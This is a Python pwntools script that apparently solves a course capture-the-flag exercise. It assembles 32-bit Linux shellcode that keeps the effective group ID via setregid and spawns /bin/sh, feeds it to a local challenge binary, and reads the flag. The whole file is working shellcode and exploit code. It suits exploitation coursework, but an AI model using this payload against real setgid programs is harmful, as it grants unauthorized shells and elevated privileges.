#!/usr/bin/env python3
from pwn import asm, context, process
import os

# ensure 32-bit Linux assembly, intel syntax
context.clear(arch="i386", os="linux", bits=32)
# context.syntax = "intel"

shellcode = asm(
"""
/* getegid(); setregid(egid, egid) */
xor     eax, eax          /* 31 c0 */
mov     al, 0x32          /* b0 32 */
int     0x80              /* cd 80       ; getegid -> eax */
push    eax               /* 50          ; save gid */
pop     ebx               /* 5b          ; ebx = gid */
push    eax
pop     ecx               /* 59          ; ecx = gid */

xor     eax, eax
mov     al, 0x47          /* b0 47 */
int     0x80              /* cd 80       ; setregid(ebx, ecx) */

/* execve("/bin/sh", 0, 0) */
xor     eax, eax          /* zero eax */
push    eax               /* push 0 (terminator) */
push    0x68732f2f        /* push "//sh" (2f2f7368) */
push    0x6e69622f        /* push "/bin" (2f62696e) */
mov     ebx, esp          /* pointer to "/bin//sh" */
xor     ecx, ecx          /* argv = 0 */
xor     edx, edx          /* envp = 0 */
mov     al, 0x0b          /* execve */
int     0x80
"""
)
outpath = os.path.abspath("shellcode.bin")
with open("shellcode.bin", "wb") as f:
    f.write(shellcode)
p = process(['./03-nonzero-shellcode-32'], env={'PATH':'/bin:/usr/bin'})
p.sendline(b"cat flag")
flag = p.recvline_regex(b"[Cc][Ss]6332{.*}").decode()
print("Flag:", flag)